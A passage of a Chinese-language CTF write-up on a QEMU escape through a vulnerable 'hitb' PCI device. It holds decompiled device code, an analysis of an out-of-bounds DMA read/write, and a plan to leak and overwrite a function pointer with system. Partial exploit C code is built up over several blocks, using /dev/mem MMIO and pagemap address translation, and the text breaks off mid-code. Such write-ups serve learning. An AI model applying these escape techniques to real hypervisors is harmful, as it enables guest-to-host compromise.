class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_dma_timer</span><span class="params">(HitbState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *cnt_low; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *v6; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  cmd = opaque-&gt;dma.cmd;</span><br><span class="line">  <span class="keyword">if</span> ( (cmd &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (cmd &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(LODWORD(opaque-&gt;dma.src) - <span class="number">0x40000</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (cmd &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">        opaque-&gt;enc(v7, opaque-&gt;dma.cnt);</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)&amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">      &#125;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, <span class="number">1</span>);<span class="comment">// 读</span></span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">uint8_t</span> *)&amp;opaque[<span class="number">-36</span>] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)opaque-&gt;dma.dst - <span class="number">2824</span>;</span><br><span class="line">      LODWORD(cnt_low) = (_DWORD)opaque + opaque-&gt;dma.dst - <span class="number">0x40000</span> + <span class="number">3000</span>;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, <span class="number">0</span>);<span class="comment">// 写</span></span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (v4 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)LODWORD(opaque-&gt;dma.cnt);</span><br><span class="line">        opaque-&gt;enc((<span class="keyword">char</span> *)v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cnt_low);</span><br><span class="line">        v4 = opaque-&gt;dma.cmd;</span><br><span class="line">        v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    opaque-&gt;dma.cmd = v4 &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">      hitb_raise_irq(opaque, (<span class="keyword">uint32_t</span>)cnt_low);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细分析分支的话可以知道，cmd末位必须是1，根据倒数第二位是0还是1可以分别进入一个读或写的分支，主要是通过<code>cpu_physical_memory_rw</code>这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">cpu_physical_memory_rw</span><span class="params">(hwaddr addr, <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> is_write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  MemTxAttrs_0 v5; <span class="comment">// edx OVERLAPPED</span></span><br><span class="line"></span><br><span class="line">  v5 = (MemTxAttrs_0)<span class="number">1</span>;</span><br><span class="line">  address_space_rw(&amp;address_space_memory, addr, v5, buf, len, is_write != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">MemTxResult __fastcall <span class="title">address_space_rw</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        AddressSpace_0 *as,</span></span></span><br><span class="line"><span class="function"><span class="params">        hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">        MemTxAttrs_0 attrs,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">uint8_t</span> *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">bool</span> is_write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( is_write )</span><br><span class="line">    <span class="keyword">return</span> address_space_write(as, addr, attrs, buf, len);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> address_space_read_full(as, addr, attrs, buf, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体的这种QEMU的API函数可以参见QEMU的源码，会比反编译出来的好看很多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_physical_memory_rw</span><span class="params">(hwaddr addr, <span class="keyword">uint8_t</span> *buf,<span class="keyword">int</span> len, <span class="keyword">int</span> is_write)</span></span>;</span><br></pre></td></tr></table></figure><p>这个函数is_write为1时，读buf到addr，为0时读addr到buf</p><p>而在这个timer函数中，拿读来举例子，由于<code>cnt_low</code>是我们可控的(因为我们可以通过MMIO_WRITE来设置<code>opaque-&gt;dma.src</code>)，进而控制<code>v2</code>,并且这里没有作检查，所以就会有越界读写的漏洞</p><p>那么思路就明确了，我们可以通过泄露<code>system</code>值然后覆写<code>HitbState</code>的<code>enc</code>函数指针,然后调用即可</p><p>我们可以根据<code>hitb_mmio_write</code>以及<code>hitb_mmio_read</code>提供的一系列规则，通过MMIO操作来设置<code>HitbState</code>的一些值，然后在进入特定分支调用timer回调函数进行泄露等操作</p><p>由于没有掐掉符号表，所以在相应地方下断点很容易，调试着看看即可</p><p>比如我可以在<code>hitb_dma_timer</code>上下断点，根据参数rdi确定此时那个HitbState结构体的一些数据</p><p><img src="https://s2.loli.net/2023/05/10/rKTzNMFExetkaHp.png" alt="image-20230510215501898"></p><p>但是有时候打印结果太长，我们只想看部分，此时可以通过set变量然后查看即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> <span class="variable">$a</span> = *((HitbState *) (0x555dc0e1d430))</span><br><span class="line">pwndbg&gt; p /x <span class="variable">$a</span>.dma</span><br><span class="line"><span class="variable">$3</span> = &#123;</span><br><span class="line">  src = 0x41000,</span><br><span class="line">  dst = 0x20ee470,</span><br><span class="line">  cnt = 0x8,</span><br><span class="line">  cmd = 0x3</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>第一次写QEMU逃逸的EXP，就一步步分析,然后调试一下</p><p><strong>在练习的过程中动态调试是很重要的，在关键函数处下断点，算偏移之类的</strong></p><p>首先把MMIO，还有虚拟地址到物理地址的一些函数准备好</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmio+addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfea00000</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于漏洞点在hitb_dma_timer,然后我们分析可以知道，要在mmio_write进入的话需要满足addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0，还有便是进去的时候HitbState一些参数需要设置好，主要是<code>src、dst、cnt、cmd</code>等，在mmio_write根据相应分支写相应函数即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*if ( addr == 0x80 )</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )</span></span><br><span class="line"><span class="comment">        opaque-&gt;dma.src = val;                  // 设置src</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint32_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,src);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">          if ( addr == 0x90 )</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            if ( (opaque-&gt;dma.cmd &amp; 1) == 0 )</span></span><br><span class="line"><span class="comment">              opaque-&gt;dma.cnt = val;            // 设置cnt</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cnt</span><span class="params">(<span class="keyword">uint32_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>,cnt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        else if ( addr == 0x88 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">          opaque-&gt;dma.dst = val;                // 设置dst</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_dst</span><span class="params">(<span class="keyword">uint32_t</span> dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>,dst);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">else if ( addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            opaque-&gt;dma.cmd = val;</span></span><br><span class="line"><span class="comment">            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span></span><br><span class="line"><span class="comment">            timer_mod(&amp;opaque-&gt;dma_timer, ns / 1000000 + 100);</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">          */</span></span><br></pre></td></tr></table></figure><p>我们可以通过下断点查看结构体的dma字段的方法来看看我们设置的对不对</p><p>简单测试一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmio+addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint32_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,src);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cnt</span><span class="params">(<span class="keyword">uint32_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>,cnt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_dst</span><span class="params">(<span class="keyword">uint32_t</span> dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>,dst);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfea00000</span>);</span><br><span class="line">    set_src(<span class="number">0x114</span>);</span><br><span class="line">    set_cnt(<span class="number">0x514</span>);</span><br><span class="line">    set_dst(<span class="number">0x191</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态编译好之后打包，然后下断点调试看看</p><p><img src="https://s2.loli.net/2023/05/10/B7vqFWICmLEVGgn.png" alt="image-20230510222900026"></p><p>在以HitbState结构体指针为参数的函数上下断点得到HitbState地址，这里可以<code>b hitb_mmio_write</code></p><p><img src="https://s2.loli.net/2023/05/10/fW7q4jdzMCX1LEJ.png" alt="image-20230510223116060"></p><p>然后根据刚刚的方法进行<code>set $a = xxx</code> 查看结构体即可</p><p><img src="https://s2.loli.net/2023/05/10/Bw4X5et2FjQ9PhO.png" alt="image-20230510230818098"></p><p>（原来相应成员内存更改之后p/x显示的变量并不会动态更改，还是需要再set一下，调了半天</p><p>那么接下来就是越界读的部分了，由于<code>HitbState</code>存了enc指针，我们可以泄露它，算出<code>.text</code>基址,然后再计算处<code>system@plt</code></p><p>所以就是分析进入<code>hitb_dma_timer</code>分支的操作了，和上面的一样，可以写出从<code>dma_buf</code>数组中拷贝数据到<code>dma.dst</code>上，还有从<code>dma.src</code>写数据到<code>dma_buf</code>数组中。需要注意的是，我们调用的<code>cpu_physical_memory_rw</code>要求地址是物理地址，所以先转换一下。由于减去了 0x40000，这里再加上方便控制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从src拷贝到dst</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_from_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(src+<span class="number">0x40000</span>);</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(gva2gpa(dst));</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从dst写到src</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_to_dma</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_src(gva2gpa(src));</span><br><span class="line">    set_cnt(cnt);</span><br><span class="line">    set_dst(dst+<span class="number">0x40000</span>);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后简单动调，先把偏移定成0，之后下断点确定一下enc指针的偏移(或者直接根据结构体确定偏移为4096也行，这样快一点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000B</span>B8 dma_buf db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001B</span>B8 enc dq ?                                ; offset</span><br><span class="line"><span class="number">00001B</span>C0 dma_mask d</span><br></pre></td></tr></table></figure><p>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmio+addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint64_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,src);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cnt</span><span class="params">(<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>,cnt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> 